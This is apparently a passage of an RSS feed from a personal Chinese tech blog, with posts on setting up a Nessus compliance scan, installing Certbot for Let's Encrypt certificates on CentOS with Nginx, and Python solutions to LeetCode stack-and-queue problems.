<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hexo</title>
    <link>https://m01ly.github.io/</link>
    
    <atom:link href="https://m01ly.github.io/atom.xml" rel="self" type="application/rss+xml"/>
    
    <description>description123456</description>
    <pubDate>Fri, 12 Nov 2021 08:51:02 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>bigdata-hadoop-yarn</title>
      <link>https://m01ly.github.io/2021/11/12/bigdata-hadoop-yarn/</link>
      <guid>https://m01ly.github.io/2021/11/12/bigdata-hadoop-yarn/</guid>
      <pubDate>Fri, 12 Nov 2021 08:51:02 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/11/12/bigdata-hadoop-yarn/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>bigdata-mapreduce</title>
      <link>https://m01ly.github.io/2021/11/12/bigdata-mapreduce/</link>
      <guid>https://m01ly.github.io/2021/11/12/bigdata-mapreduce/</guid>
      <pubDate>Fri, 12 Nov 2021 08:50:43 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/11/12/bigdata-mapreduce/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>leetcode-binarytree</title>
      <link>https://m01ly.github.io/2021/07/29/leetcode-binarytree/</link>
      <guid>https://m01ly.github.io/2021/07/29/leetcode-binarytree/</guid>
      <pubDate>Thu, 29 Jul 2021 06:55:47 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/07/29/leetcode-binarytree/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>nessus扫描合规性</title>
      <link>https://m01ly.github.io/2021/07/28/scan-nessus-compliance/</link>
      <guid>https://m01ly.github.io/2021/07/28/scan-nessus-compliance/</guid>
      <pubDate>Wed, 28 Jul 2021 06:44:50 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 创建一个高级扫描</p><p><img src="/2021/07/28/scan-nessus-compliance/1627455726030.png" alt="1627455726030"></p><p>3 打开 <strong>Plugins</strong>选项.</p><p>Disable 所有插件除了下面几个:</p><ul><li><p>General</p></li><li><p>Settings</p></li><li><p>Policy Compliance</p></li><li><p>Service Detection</p><p>4 在Compliance部分 选择 需要扫描的合规系统：centos或者其他.</p></li></ul><p><img src="/2021/07/28/scan-nessus-compliance/1627456193812.png" alt="1627456193812"></p><p>保存扫描即可。</p><ol><li><a href="https://community.tenable.com/s/article/Troubleshoot-failed-audit-compliance-scans">Troubleshoot-failed-audit-compliance-scans</a></li><li><a href="https://zh-cn.tenable.com/blog/how-to-maximize-compliance-scans-with-nessus?tns_redirect=true">如何使用nessus启动合规性扫描</a> 官网</li><li><a href="https://static.tenable.com/documentation/nessus_compliance_checks.pdf">具体如何配置Nessus的合规扫描文件</a>   具体操作</li><li><a href="https://zh-cn.tenable.com/downloads/download-all-compliance-audit-files">下载nessus策略的原始文件</a>  包含cis等多个标准</li></ol>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AE%89%E5%85%A8%E6%89%AB%E6%8F%8F/">安全扫描</category>
      
      
      <comments>https://m01ly.github.io/2021/07/28/scan-nessus-compliance/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>cert-letsencrypt</title>
      <link>https://m01ly.github.io/2021/07/22/cert-letsencrypt/</link>
      <guid>https://m01ly.github.io/2021/07/22/cert-letsencrypt/</guid>
      <pubDate>Thu, 22 Jul 2021 06:45:25 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1 SSH 进入服务器</p><p>以具有 sudo 权限的用户身份通过 SSH 连接到运行您的 HTTP 网站的服务器。</p><p>2 安装 snapd</p><p>您需要安装 snapd 并确保按照任何说明启用经典 snap 支持。<br>按照<a href="https://snapcraft.io/docs/installing-snapd/">snapcraft 网站</a>上<a href="https://snapcraft.io/docs/installing-snapd/">的</a>这些说明<a href="https://snapcraft.io/docs/installing-snapd/">安装 snapd</a>。</p><p>（1）将 EPEL 添加到 CentOS 7</p><p>可以使用以下命令将 EPEL 存储库添加到 CentOS 7 系统：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum <span class="token function">install</span> epel-release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）安装 snapd</p><p>将 EPEL 存储库添加到您的 CentOS 安装后，只需安装<em>snapd</em>包：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> yum <span class="token function">install</span> snapd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当出现以下图片安装失败，原因为图中可以看到EPEL 存储库存储库中的snapd版本为2.49，但是最新版本为2.51，只有最新版本才有rpm包，因此获取失败，主要因为yum版本过低，应该升级yum版本即可yum -y upgrade;yum -y update</p><p><img src="/2021/07/22/cert-letsencrypt/1627006806810.png" alt="1627006806810"></p><p>如下yum版本和内核版本可以成功安装snapd</p><p><img src="/2021/07/22/cert-letsencrypt/1627006157537.png" alt="1627006157537"></p><p>可以看到存储库中的snapd是最新版本2.51，安装成功</p><p><img src="/2021/07/22/cert-letsencrypt/1627006992635.png" alt="1627006992635"></p><p>安装后，需要启用管理主 snap 通信套接字的<em>systemd</em>单元：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> systemctl <span class="token function">enable</span> --now snapd.socket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要启用<em>经典</em>snap 支持，请输入以下内容以在<code>/var/lib/snapd/snap</code>和之间创建符号链接<code>/snap</code>：</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">ln</span> -s /var/lib/snapd/snap /snap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注销并重新登录或重新启动系统以确保正确更新 snap 的路径。</p><p>3 确保您的 snapd 版本是最新的</p><p>在机器上的命令行上执行以下说明，以确保您拥有最新版本的<code>snapd</code>。</p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> snap <span class="token function">install</span> core<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/22/cert-letsencrypt/1627007070131.png" alt="1627007070131"></p><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> snap refresh core<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/22/cert-letsencrypt/1627007140412.png" alt="1627007140412"></p><p>4 删除 certbot-auto 和任何 Certbot OS 包</p><p>如果您使用<code>apt</code>、<code>dnf</code>或<code>yum</code>等操作系统包管理器安装了任何 Certbot 包 ，则应在安装 Certbot snap 之前将其删除，以确保在运行命令 <code>certbot 时使用的</code>是 snap，而不是从您的操作系统包安装经理。执行此操作的确切命令取决于您的操作系统，但常见示例是<code>sudo apt-get remove certbot</code>、<code>sudo dnf remove certbot</code>或<code>sudo yum remove certbot</code>。</p><p>如果您之前通过 certbot-auto 脚本使用过 Certbot，您还应该按照<a href="https://certbot.eff.org/docs/uninstall.html">此处</a>的说明删除其安装。</p><p>5 安装certbot</p><p>在机器上的命令行上运行此命令以安装 Certbot。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> snap <span class="token function">install</span> --classic certbot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6 准备 Certbot 命令</p><p>在机器上的命令行执行以下指令，确保<code>certbot</code>命令可以运行。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> -s /snap/bin/certbot /usr/bin/certbot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7 选择您希望如何运行 Certbot</p><ul><li><p>要么获取并安装您的证书…</p><p>运行此命令以获取证书并让 Certbot 自动编辑您的 Nginx 配置以提供服务，只需一步即可打开 HTTPS 访问。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> certbot --nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><img src="/2021/07/22/cert-letsencrypt/1627010116619.png" alt="1627010116619"></p><ul><li><p>或者，只需获得证书</p><p>如果您感觉更保守并希望手动更改 Nginx 配置，请运行此命令。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> certbot certonly --nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p><a href="http://archery-sec9002.eniot.io/">http://archery-sec9002.eniot.io/</a></p><p>8 测试自动续订</p><p>您系统上的 Certbot 软件包带有一个 cron 作业或 systemd 计时器，它们将在您的证书到期之前自动更新您的证书。除非您更改配置，否则您无需再次运行 Certbot。</p><p>您可以通过运行以下命令来测试证书的自动续订：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> certbot renew --dry-run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>9 如果该命令正确完成，您的证书将在后台自动更新。</p><p>确认 Certbot 工作:要确认您的站点设置正确，请在浏览器中访问<code>https://yourwebsite.com/</code>并在 URL 栏中查找锁定图标。</p><p><a href="https://certbot.eff.org/lets-encrypt/centosrhel7-nginx"><a href="https://certbot.eff.org/lets-encrypt/centosrhel7-nginx.html">CentOS/RHEL 7 上的 Nginx</a></a></p><p><a href="https://snapcraft.io/docs/installing-snap-on-centos">centos中安装snapd</a></p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/07/22/cert-letsencrypt/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>栈和队列相关题目</title>
      <link>https://m01ly.github.io/2021/07/16/leetcode-stackandqueue/</link>
      <guid>https://m01ly.github.io/2021/07/16/leetcode-stackandqueue/</guid>
      <pubDate>Fri, 16 Jul 2021 02:24:11 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>栈先进后出，队列先进先出。</p><table><thead><tr><th align="left">题号</th><th align="left">题目</th><th>难度</th></tr></thead><tbody><tr><td align="left">leetcode 20</td><td align="left"><a href="https://leetcode-cn.com/problems/valid-parentheses/">有效的括号</a></td><td>简单</td></tr><tr><td align="left">剑指 Offer 09</td><td align="left"><a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof/">用两个栈实现队列</a></td><td>简单</td></tr><tr><td align="left">leetcode 225</td><td align="left"><a href>用队列实现栈</a></td><td>简单</td></tr><tr><td align="left">leetcode 1047</td><td align="left"><a href="https://leetcode-cn.com/problems/remove-all-adjacent-duplicates-in-string/">删除字符串中的所有相邻重复项</a></td><td>简单</td></tr><tr><td align="left">leetcode  1021</td><td align="left"><a href="https://leetcode-cn.com/problems/remove-outermost-parentheses/">删除最外层的括号</a></td><td>简单</td></tr></tbody></table><h2 id="1-剑指-Offer-09-用两个栈实现队列"><a href="#1-剑指-Offer-09-用两个栈实现队列" class="headerlink" title="1 剑指 Offer 09. 用两个栈实现队列"></a>1 <a href="https://leetcode-cn.com/problems/yong-liang-ge-zhan-shi-xian-dui-lie-lcof/">剑指 Offer 09. 用两个栈实现队列</a></h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>用两个栈实现一个队列。队列的声明如下，请实现它的两个函数 appendTail 和 deleteHead ，分别完成在队列尾部插入整数和在队列头部删除整数的功能。(若队列中没有元素，deleteHead 操作返回 -1 )</p><p>示例 1：</p><p>输入：<br>[“CQueue”,”appendTail”,”deleteHead”,”deleteHead”]<br>[[],[3],[],[]]<br>输出：[null,null,3,-1]</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目只要求实现 加入队尾appendTail() 和 删除队首deleteHead() 两个函数的正常工作，因此我们可以设计栈 A 用于加入队尾操作，栈 B 用于将元素倒序，从而实现删除队首元素。</p><p>加入队尾 appendTail()函数： 将数字 val 加入栈 A 即可。<br>删除队首deleteHead()函数： 有以下三种情况。<br>    当栈 B 不为空： B中仍有已完成倒序的元素，因此直接返回 B 的栈顶元素。<br>    否则，当 A 为空： 即两个栈都为空，无元素，因此返回 -1−1 。<br>    否则： 将栈 A 元素全部转移至栈 B 中，实现元素倒序，并返回栈 B 的栈顶元素。</p><p><img src="/2021/07/16/leetcode-stackandqueue/twostackTobequeue.gif" alt="twostackTobequeue"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">class</span> <span class="token class-name">CQueue</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>A<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>B<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">appendTail</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type value: int        :rtype: None        """</span>        self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">deleteHead</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :rtype: int        """</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>B<span class="token punctuation">:</span> <span class="token keyword">return</span> self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#如果B栈有元素  则弹出栈顶元素即可</span>        <span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>A<span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">#B为空 并且A 为空  则返回-1</span>        <span class="token comment" spellcheck="true">#当A不为空的时候</span>        <span class="token keyword">while</span> self<span class="token punctuation">.</span>A<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将A栈弹出  入B栈</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><strong>时间复杂度：</strong> appendTail()函数为 O(1) ；deleteHead() 函数在 N 次队首元素删除操作中总共需完成 N个元素的倒序。<br><strong>空间复杂度：</strong>  O(N)最差情况下，栈 A 和 B 共保存 N个元素。</p><h2 id="2-leetcode225-用队列实现栈"><a href="#2-leetcode225-用队列实现栈" class="headerlink" title="2 leetcode225. 用队列实现栈"></a>2 <a href="https://leetcode-cn.com/problems/implement-stack-using-queues/">leetcode225. 用队列实现栈</a></h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>请你仅使用两个队列实现一个后入先出（LIFO）的栈，并支持普通栈的全部四种操作（push、top、pop 和 empty）。</p><p>实现 MyStack 类：</p><p>void push(int x) 将元素 x 压入栈顶。<br>int pop() 移除并返回栈顶元素。<br>int top() 返回栈顶元素。<br>boolean empty() 如果栈是空的，返回 true ；否则，返回 false 。</p><p>注意：</p><p>你只能使用队列的基本操作 —— 也就是 push to back、peek/pop from front、size 和 is empty 这些操作。<br>你所使用的语言也许不支持队列。 你可以使用 list （列表）或者 deque（双端队列）来模拟一个队列 , 只要是标准的队列操作即可。</p><p>示例：</p><p>输入：<br>[“MyStack”, “push”, “push”, “top”, “pop”, “empty”]<br>[[], [1], [2], [], [], []]<br>输出：<br>[null, null, null, 2, 2, false]</p><p>解释：<br>MyStack myStack = new MyStack();<br>myStack.push(1);<br>myStack.push(2);<br>myStack.top(); // 返回 2<br>myStack.pop(); // 返回 2<br>myStack.empty(); // 返回 False</p><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyStack</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Initialize your data structure here.        """</span>        self<span class="token punctuation">.</span>A<span class="token operator">=</span>deque<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>B<span class="token operator">=</span>deque<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Push element x onto stack.        :type x: int        :rtype: None        """</span>        self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Removes the element on top of the stack and returns that element.        :rtype: int        """</span>        size<span class="token operator">=</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>A<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">#留一个元素</span>        <span class="token keyword">while</span> size<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>B<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将A的元素除了最左边的都弹入B中</span>            size<span class="token operator">=</span>size<span class="token number">-1</span>        res<span class="token operator">=</span>self<span class="token punctuation">.</span>A<span class="token punctuation">.</span>popleft<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#返回</span>        self<span class="token punctuation">.</span>A<span class="token punctuation">,</span>self<span class="token punctuation">.</span>B<span class="token operator">=</span>self<span class="token punctuation">.</span>B<span class="token punctuation">,</span>self<span class="token punctuation">.</span>A<span class="token comment" spellcheck="true">##将que2和que1交换 que1经过之前的操作应该是空了</span>        <span class="token comment" spellcheck="true">#一定注意不能直接使用que1 = que2 这样que2的改变会影响que1 可以用浅拷贝</span>        <span class="token keyword">return</span> res    <span class="token keyword">def</span> <span class="token function">top</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Get the top element.        :rtype: int        """</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">empty</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Returns whether the stack is empty.        :rtype: bool        """</span>        <span class="token keyword">if</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>A<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><strong>时间复杂度：</strong>入栈操作O(n)，其余操作都是 O(1)。<br>入栈操作需要将A 中的 n个元素出队，并入队 n+1个元素到B ，共有 2n+1 次操作，每次出队和入队操作的时间复杂度都是 O(1)，因此入栈操作的时间复杂度是O(n)。<br>出栈操作对应将A的前端元素出队，时间复杂度是 O(1)。<br>获得栈顶元素操作对应获得 A的前端元素，时间复杂度是 O(1)。<br>判断栈是否为空操作只需要判断A是否为空，时间复杂度是 O(1)。</p><p><strong>空间复杂度：</strong>O(n)，其中 n 是栈内的元素。需要使用两个队列存储栈内的元素。</p><h2 id="3-leetcode-20-有效的括号"><a href="#3-leetcode-20-有效的括号" class="headerlink" title="3 leetcode 20. 有效的括号"></a>3 <a href="https://leetcode-cn.com/problems/valid-parentheses/">leetcode 20. 有效的括号</a></h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效。</p><p>有效字符串需满足：</p><p>左括号必须用相同类型的右括号闭合。<br>左括号必须以正确的顺序闭合。</p><p>示例 1：</p><p>输入：s = “()”<br>输出：true<br>示例 2：</p><p>输入：s = “()[]{}”<br>输出：true</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.1 待入栈元素在字典中无匹配元素即都是左括号 则 入栈</p><p>1.2 若待入栈元素在字典中有匹配元素</p><p>​    1.2.1 stack不为空（防止s=”]”的情况） 并且 在栈顶匹配元素成功 </p><p>​              则 将栈顶元素pop出</p><p>​     1.2.2 否则 直接返回False</p><p><img src="/2021/07/16/leetcode-stackandqueue/isvalid.gif" alt="isvalid"></p><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">isValid</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type s: str        :rtype: bool        """</span>        dic<span class="token operator">=</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;')':'(','&amp;#125;':"&amp;#123;","]":"["&amp;#125;</span>        stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>            <span class="token keyword">if</span> dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">is</span> None<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#待入栈元素在字典中无匹配元素即都是左括号 则 入栈</span>                stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">##若待入栈元素在字典中有匹配元素</span>                <span class="token keyword">if</span>  stack <span class="token operator">and</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span>dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#并且stack不为空（防止s="]"的情况） 在栈顶匹配元素成功 则 将栈顶元素pop出</span>                    stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">##例如    s="(]"</span>                    <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> len<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-2"><a href="#复杂度分析-2" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度：O(n)，其中 n是字符串 s的长度。</p><p>空间复杂度：O(n+∣Σ∣)，其中 Σ 表示字符集，本题中字符串只包含 6 种括号，6∣Σ∣=6。栈中的字符数量为 O(n)，而哈希表使用的空间为 O(∣Σ∣)，相加即可得到总空间复杂度。</p><h2 id="4-leetcode1047-删除字符串中的所有相邻重复项"><a href="#4-leetcode1047-删除字符串中的所有相邻重复项" class="headerlink" title="4 leetcode1047. 删除字符串中的所有相邻重复项"></a>4 <a href="https://leetcode-cn.com/problems/remove-all-adjacent-duplicates-in-string/">leetcode1047. 删除字符串中的所有相邻重复项</a></h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>给出由小写字母组成的字符串 S，重复项删除操作会选择两个相邻且相同的字母，并删除它们。</p><p>在 S 上反复执行重复项删除操作，直到无法继续删除。</p><p>在完成所有重复项删除操作后返回最终的字符串。答案保证唯一。</p><p> 示例：</p><p>输入：”abbaca”<br>输出：”ca”<br>解释：<br>例如，在 “abbaca” 中，我们可以删除 “bb” 由于两字母相邻且相同，这是此时唯一可以执行删除操作的重复项。之后我们得到字符串 “aaca”，其中又只有 “aa” 可以执行重复项删除操作，所以最后的字符串为 “ca”。</p><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>充分理解题意后，我们可以发现，当字符串中同时有多组相邻重复项时，我们无论是先删除哪一个，都不会影响最终的结果。因此我们可以从左向右顺次处理该字符串。</p><p>而消除一对相邻重复项可能会导致新的相邻重复项出现，如从字符串abba 中删除 bb 会导致出现新的相邻重复项aa 出现。因此我们需要保存当前还未被删除的字符。一种显而易见的数据结构呼之欲出：栈。我们只需要遍历该字符串，如果当前字符和栈顶字符相同，我们就贪心地将其消去，否则就将其入栈即可。</p><p>本题要删除相邻相同元素，其实也是匹配问题，相同左元素相当于左括号，相同右元素就是相当于右括号，匹配上了就删除。类似于<a href="https://leetcode-cn.com/problems/valid-parentheses/">leetcode 20. 有效的括号</a></p><p>那么再来看一下本题：可以把字符串顺序放到一个栈中，然后如果相同的话 栈就弹出，这样最后栈里剩下的元素都是相邻不相同的元素了。</p><p><img src="/2021/07/16/leetcode-stackandqueue/delete.gif" alt="delete"></p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">removeDuplicates</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    :type s: str    :rtype: str    """</span>    stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">if</span> stack <span class="token operator">and</span> i<span class="token operator">==</span>stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#栈不为空  当和栈顶元素相等时候，pop栈顶元素</span>            stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#否则元素入栈</span>            stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span aria-hidden="true" 